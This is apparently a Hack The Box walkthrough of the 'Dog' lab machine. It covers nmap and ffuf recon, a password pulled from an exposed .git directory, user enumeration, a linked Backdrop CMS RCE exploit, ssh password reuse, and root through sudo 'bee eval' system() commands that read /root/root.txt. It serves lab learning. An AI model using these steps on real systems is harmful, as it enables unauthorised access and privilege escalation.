# HTB: Dog - Ashbo3n

**Machine Name**: Dog

**Rating**: 3.8

**Area of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Remote Code Execution, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Upload</span>

Nmap:

```Shellcode
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Fri Jan  2 22:16:07 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.231.223
   2   │ Nmap scan report for 10.129.231.223
   3   │ Host is up, received reset ttl 63 (0.24s latency).
   4   │ Scanned at 2026-01-02 22:16:08 EST for 33s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON         VERSION
   7   │ 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
  10   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cT
       │ GrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnij
       │ XzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
  11   │ |   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
  12   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
  13   │ |   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
  14   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
  15   │ 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
  16   │ |_http-generator: Backdrop CMS 1 (https://backdropcms.org)
  17   │ | http-git: 
  18   │ |   10.129.231.223:80/.git/
  19   │ |     Git repository found!
  20   │ |     Repository description: Unnamed repository; edit this file 'description' to name the...
  21   │ |_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
  22   │ | http-methods: 
  23   │ |_  Supported Methods: GET HEAD POST OPTIONS
  24   │ |_http-title: Home | Dog
  25   │ |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
  26   │ |_http-server-header: Apache/2.4.41 (Ubuntu)
  27   │ | http-robots.txt: 22 disallowed entries 
  28   │ | /core/ /profiles/ /README.md /web.config /admin 
  29   │ | /comment/reply /filter/tips /node/add /search /user/register 
  30   │ | /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
  31   │ | /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
  32   │ |_/?q=user/register /?q=user/login /?q=user/logout
  33   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  34   │ 
  35   │ Read data files from: /usr/share/nmap
  36   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  37   │ # Nmap done at Fri Jan  2 22:16:41 2026 -- 1 IP address (1 host up) scanned in 33.78 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Run FFUF:

```bash
┌──(root㉿kali)-[~/HTB/Dog]
└─# ffuf -c -u http://dog.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dog.htb/FUZZ
 :: Wordlist         : FUZZ: /root/wordlist/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/index              [Status: 200, Size: 344667, Words: 814, Lines: 3250, Duration: 275ms]
.hta                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 2407ms]
.git                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 3414ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 5425ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 5426ms]
.git/logs/              [Status: 200, Size: 1126, Words: 77, Lines: 18, Duration: 5433ms]
.htaccess               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 5434ms]
.htpasswd               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 5427ms]
core                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 237ms]
files                   [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 234ms]
index.php               [Status: 200, Size: 13260, Words: 1368, Lines: 202, Duration: 267ms]
layouts                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 238ms]
modules                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 239ms]
robots.txt              [Status: 200, Size: 1198, Words: 114, Lines: 47, Duration: 242ms]
server-status           [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 239ms]
sites                   [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 243ms]
themes                  [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 251ms]
:: Progress: [4746/4746] :: Job [1/1] :: 233 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
                                                                                              
```

Accessing .git:

[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/image.png)](http://localhost:4444/uploads/images/gallery/2026-01/image.png)

Using gitdumper Download the .git library.

Found Password:

[![a0cimage.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/76Va0cimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/76Va0cimage.png)

Enumerate users:

```bash
┌──(env)─(root㉿kali)-[~/HTB/Dog]
└─# ffuf -c -request enum.req -request-proto http -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 60 -fr 'Page not found'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dog.htb/?q=accounts/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Host: dog.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Page not found
________________________________________________

axel                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 989ms]
john                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 331ms]
morris                  [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 891ms]
rosa                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 565ms]
tiffany                 [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 758ms]
:: Progress: [10177/10177] :: Job [1/1] :: 56 req/sec :: Duration: [0:03:12] :: Errors: 0 ::
                                                                                                                                                                                                                                           
┌──(env)─(root㉿kali)-[~/HTB/Dog]
└─# 

```

[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/gmFimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/gmFimage.png)

Got into admin dashboard with user and the password found earlier.

Found this github repo for the exploit to gain the shell:

`<a href="https://github.com/rvizx/backdrop-rce?tab=readme-ov-file">https://github.com/rvizx/backdrop-rce?tab=readme-ov-file</a>`

Got the shell:

[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/S3aimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/S3aimage.png)

Viewing /etc/passwd we can see another user named: `johncusack` Try to log in via ssh with password previously.

[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/5wYimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/5wYimage.png)

Success. Got access to user johncusack via ssh. go to home dir and you will find the user flag.

[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/k4Cimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/k4Cimage.png)

## Root

With sudo -l we can see we can run /usr/local/bin/bee as root,

```
bee eval 'your arbitrary PHP code here;'
```

can run php code as root. Go to /var/www/html else bee will throw an error, and then run this:

```
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval "system('whoami');"
root

```

This should return root, and now to get the root flag just do:

```
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval "system('cat /root/root.txt');"
REDACTED
johncusack@dog:/var/www/html$ 


```

## Mitigations

1. Make sure .git is not exposed to internet.
2. Make sure no same passwords are used

## Skill learned

1. User Enumeration
2. Use of bupsuite
3. use of FFUF
